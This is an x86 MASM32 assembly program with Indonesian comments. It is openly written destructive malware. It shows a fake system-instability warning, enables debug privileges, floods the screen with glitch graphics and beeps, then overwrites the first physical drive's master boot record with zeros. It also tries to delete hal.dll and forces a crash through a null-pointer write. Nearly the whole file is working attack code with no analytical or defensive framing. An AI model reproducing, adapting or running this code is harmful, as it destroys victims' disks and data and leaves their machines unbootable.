.386
.model flat, stdcall
option casemap :none

include \masm32\include\windows.inc
include \masm32\include\user32.inc
include \masm32\include\kernel32.inc
include \masm32\include\gdi32.inc
include \masm32\include\advapi32.inc
includelib \masm32\lib\user32.lib
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\gdi32.lib
includelib \masm32\lib\advapi32.lib

.data
    szCaption db "SYSTEM WARNING", 0
    szMessage db "Critical system instability detected. Emergency shutdown recommended.", 0
    szError db "Access denied. Admin privileges required.", 0
    driveName db "\\.\PhysicalDrive0", 0
    mbrData db 512 dup(0)  ; Empty MBR data
    
    ; Glitch messages
    glitch1 db "MEMORY CORRUPTION DETECTED", 0
    glitch2 db "SYSTEM FAILURE IMMINENT", 0
    glitch3 db "KERNEL PANIC", 0
    glitch4 db "HARDWARE MALFUNCTION", 0
    
    ; For privilege escalation
    tokenHandle dd 0
    tkp TOKEN_PRIVILEGES <?>
    
.data?
    hDC dd ?
    hWindow dd ?
    counter dd ?
    hDrive dd ?
    bytesWritten dd ?
    rect RECT <?>
    hThread1 dd ?
    hThread2 dd ?

.code
; Thread untuk efek visual glitch
GlitchThread proc param:DWORD
    invoke GetDesktopWindow
    mov hWindow, eax
    invoke GetDC, hWindow
    mov hDC, eax
    
    glitch_loop:
        ; Acak warna background
        invoke GetTickCount
        and eax, 0FFFFFFh
        invoke CreateSolidBrush, eax
        push eax
        invoke GetClientRect, hWindow, addr rect
        invoke FillRect, hDC, addr rect, eax
        pop eax
        invoke DeleteObject, eax
        
        ; Gambar garis-garis acak
        invoke GetTickCount
        mov ecx, 50
        draw_lines:
            push ecx
            invoke GetSystemMetrics, SM_CXSCREEN
            mov edx, eax
            invoke GetSystemMetrics, SM_CYSCREEN
            invoke GetTickCount
            and eax, edx
            mov esi, eax
            invoke GetTickCount
            and eax, 0FFFFh
            mov edi, eax
            invoke GetTickCount
            and eax, 0FFFFFFh
            invoke CreatePen, PS_SOLID, 2, eax
            push eax
            invoke SelectObject, hDC, eax
            invoke MoveToEx, hDC, esi, 0, NULL
            invoke LineTo, hDC, edi, eax
            pop eax
            invoke DeleteObject, eax
            pop ecx
            loop draw_lines
        
        ; Tampilkan pesan glitch acak
        invoke GetTickCount
        and eax, 3
        mov edx, offset glitch1
        cmp eax, 0
        je show_msg
        mov edx, offset glitch2
        cmp eax, 1
        je show_msg
        mov edx, offset glitch3
        cmp eax, 2
        je show_msg
        mov edx, offset glitch4
        show_msg:
        invoke SetBkMode, hDC, TRANSPARENT
        invoke SetTextColor, hDC, 000FF00h
        invoke GetTickCount
        and eax, 0FFh
        mov esi, eax
        invoke GetTickCount
        and eax, 0FFh
        mov edi, eax
        invoke TextOut, hDC, esi, edi, edx, sizeof edx
        
        ; Delay semakin pendek (efek semakin cepat)
        invoke GetTickCount
        and eax, 15
        add eax, 5
        invoke Sleep, eax
        
        ; Tingkatkan intensitas
        inc counter
        cmp counter, 200
        jl glitch_loop
    
    invoke ReleaseDC, hWindow, hDC
    ret
GlitchThread endp

; Thread untuk efek suara (jika ada)
SoundThread proc param:DWORD
    sound_loop:
        invoke Beep, 500, 50
        invoke Beep, 300, 50
        invoke Beep, 800, 50
        invoke Sleep, 100
        inc counter
        cmp counter, 200
        jl sound_loop
    ret
SoundThread endp

; Fungsi untuk eskalasi privilege
EnablePrivileges proc
    invoke GetCurrentProcess
    invoke OpenProcessToken, eax, TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, addr tokenHandle
    test eax, eax
    jz privilege_fail
    
    invoke LookupPrivilegeValue, NULL, SE_DEBUG_NAME, addr tkp.Privileges[0].Luid
    test eax, eax
    jz privilege_fail
    
    mov tkp.PrivilegeCount, 1
    mov tkp.Privileges[0].Attributes, SE_PRIVILEGE_ENABLED
    
    invoke AdjustTokenPrivileges, tokenHandle, FALSE, addr tkp, sizeof TOKEN_PRIVILEGES, NULL, NULL
    test eax, eax
    jz privilege_fail
    
    ret
    
    privilege_fail:
    invoke MessageBox, NULL, addr szError, addr szCaption, MB_OK or MB_ICONERROR
    invoke ExitProcess, 1
EnablePrivileges endp

; Fungsi utama
start:
    ; Tampilkan peringatan
    invoke MessageBox, NULL, addr szMessage, addr szCaption, MB_YESNO or MB_ICONWARNING
    cmp eax, IDNO
    je exit_program
    
    ; Eskalasi privilege
    call EnablePrivileges
    
    ; Mulai thread efek visual
    invoke CreateThread, NULL, 0, addr GlitchThread, NULL, 0, addr hThread1
    
    ; Mulai thread efek suara
    invoke CreateThread, NULL, 0, addr SoundThread, NULL, 0, addr hThread2
    
    ; Tunggu efek berjalan
    invoke Sleep, 5000
    
    ; Coba overwrite MBR
    invoke CreateFile, addr driveName, GENERIC_WRITE, FILE_SHARE_READ or FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL
    mov hDrive, eax
    cmp eax, INVALID_HANDLE_VALUE
    je final_crash
    
    invoke WriteFile, hDrive, addr mbrData, 512, addr bytesWritten, NULL
    invoke CloseHandle, hDrive
    
    final_crash:
    ; Crash sistem dengan berbagai cara
    ; 1. Hapus file sistem penting
    invoke DeleteFile, "C:\Windows\System32\hal.dll"
    
    ; 2. Penyalahgunaan memori
    mov eax, 0
    mov dword ptr [eax], 0DEADBEEFh
    
    ; 3. Infinite loop jika masih berjalan
    jmp $
    
    exit_program:
    invoke ExitProcess, 0
end start
